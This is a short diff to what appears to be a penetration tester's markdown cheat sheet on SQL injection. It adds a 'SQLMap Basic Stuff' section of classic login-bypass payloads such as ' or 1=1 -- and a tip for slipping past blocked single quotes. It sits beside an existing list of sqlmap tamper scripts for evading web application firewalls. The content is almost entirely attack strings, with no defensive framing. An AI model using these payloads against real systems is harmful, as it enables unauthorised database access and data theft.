@@ -17,3 +17,15 @@ MYSQL
 ```
 tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor
 ```
+SQLMap Basic Stuff
+-------------
+```
+' or 1=1 -- 
+‘ or 1=1 or ‘1’=’1
+# If single quotes are blocked try delimiting them
+/‘ or 1=1 or ‘1’=’1
+/' or 1=1 -- 
+```
+
+
+
